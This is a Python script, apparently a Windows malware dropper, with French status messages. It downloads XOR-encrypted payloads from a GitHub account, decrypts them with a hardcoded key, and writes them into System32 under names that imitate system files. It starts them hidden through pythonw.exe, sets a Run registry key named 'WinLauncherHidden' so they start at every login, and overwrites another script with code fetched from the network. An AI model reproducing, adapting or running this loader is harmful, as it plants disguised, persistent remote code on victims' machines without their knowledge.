import os
import winreg
import tempfile
import requests
import subprocess

CLE = "LUCORACORE987"
URLS = {
    "SystemRuntime32.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
    "wmihelper.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc",
}

SYSTEM32 = r"C:\Windows\System32"
LAUNCHER_NAME = "winlauncher_hidden.py"
RUN_KEY_NAME = "WinLauncherHidden"
RAW_SCRIPT_REPLACEMENT = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"


def decrypt(content: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    key_len = len(key_bytes)
    decrypted = bytearray()
    for i, b in enumerate(content):
        decrypted.append(b ^ key_bytes[i % key_len])
    return bytes(decrypted)


def write_file_binary(path, content_bytes):
    with open(path, "wb") as f:
        f.write(content_bytes)


def download_and_install():
    paths = {}
    for filename_enc, url in URLS.items():
        try:
            print(f"[i] Téléchargement de {filename_enc} depuis {url}...")
            response = requests.get(url, timeout=15)
            response.raise_for_status()

            print(f"[i] Décryptage de {filename_enc}...")
            decrypted_bytes = decrypt(response.content, CLE)
            if not decrypted_bytes:
                print(f"[!] Échec du décryptage de {filename_enc}")
                return None

            target_path = os.path.join(SYSTEM32, filename_enc[:-4])
            print(f"[i] Écriture du fichier décrypté dans {target_path}...")
            write_file_binary(target_path, decrypted_bytes)

            if not os.path.isfile(target_path):
                print(f"[!] Le fichier {target_path} n'a pas été créé.")
                return None

            print(f"[✓] Script installé : {target_path}")
            paths[filename_enc[:-4]] = target_path

        except Exception as e:
            print(f"[!] Erreur lors du traitement de {filename_enc} : {e}")
            return None
    return paths


def run_systemruntime32_immediately(path):
    print(f"[i] Lancement immédiat de {path} en arrière-plan.")
    subprocess.Popen(['pythonw.exe', path], close_fds=True)


def create_launcher():
    launcher_code = f"""import subprocess
import os
subprocess.Popen(['pythonw.exe', os.path.join(r'{SYSTEM32}', 'SystemRuntime32.py')], close_fds=True)
"""
    launcher_path = os.path.join(SYSTEM32, LAUNCHER_NAME)
    with open(launcher_path, "w", encoding="utf-8") as f:
        f.write(launcher_code)
    print(f"[✓] Launcher créé : {launcher_path}")
    return launcher_path


def add_to_startup(py_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, f'pythonw.exe "{py_path}"')
        print("[✓] Script ajouté au démarrage.")
    except Exception as e:
        print(f"[!] Erreur ajout au démarrage : {e}")


def remplacer_script_depuis_s_path():
    temp_dir = tempfile.gettempdir()
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    raw_url = RAW_SCRIPT_REPLACEMENT

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return

    try:
        print(f"[...] Téléchargement script clair depuis {raw_url}...")
        r = requests.get(raw_url, timeout=10)
        r.raise_for_status()

        if r.text.strip():
            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(r.text)
            print(f"[✓] Script clair mis à jour avec succès : {chemin_script}")
        else:
            print("[!] Contenu téléchargé vide.")
            return

    except Exception as e:
        print(f"[!] Erreur téléchargement script clair : {e}")
        return

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur suppression s_path.txt : {e}")


def main():
    if not os.access(SYSTEM32, os.W_OK):
        print("[!] Ce script doit être exécuté avec des droits administrateur.")
        return

    paths = download_and_install()
    if not paths:
        print("[!] Installation échouée.")
        return

    if 'SystemRuntime32.py' in paths:
        run_systemruntime32_immediately(paths['SystemRuntime32.py'])

    launcher_path = create_launcher()
    add_to_startup(launcher_path)

    remplacer_script_depuis_s_path()


if __name__ == "__main__":
    main()
